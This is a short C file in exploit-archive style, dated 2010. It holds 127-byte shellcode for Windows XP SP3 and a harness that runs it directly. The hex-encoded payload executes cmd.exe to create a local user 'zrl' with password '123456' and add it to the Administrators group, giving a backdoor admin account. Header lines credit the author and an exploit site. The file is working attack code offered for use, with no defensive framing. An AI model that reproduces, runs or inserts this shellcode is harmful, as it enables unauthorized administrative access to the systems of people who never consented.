/*
# Title        : win32/xp sp3 (Tr) Add Admin Account Shellcode 127 bytes
# Proof        : http://img823.imageshack.us/img823/1017/addqx.jpg
# Desc.        : usr: zrl , pass: 123456 , localgroup: Administrator
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 17/09/2010
# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Lakirdi      : off ulan off  /  http://www.youtube.com/watch?v=GbyF62skA-c
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(){

    unsigned char shellcode[]=
    "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x5d\x53\xbb\xad\x23\x86\x7c"
    "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
    "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"
    "\x65\x72\x20\x7a\x72\x6c\x20\x31\x32\x33\x34\x35\x36\x20\x2f\x61\x64"
    "\x64\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f"
    "\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73"
    "\x20\x2f\x61\x64\x64\x20\x7a\x72\x6c\x20\x26\x26\x20\x6e\x65\x74\x20"
    "\x75\x73\x65\x72\x20\x7a\x72\x6c";

    printf("Size = %d bytes\n", strlen(shellcode));

    ((void (*)())shellcode)();



    return 0;
}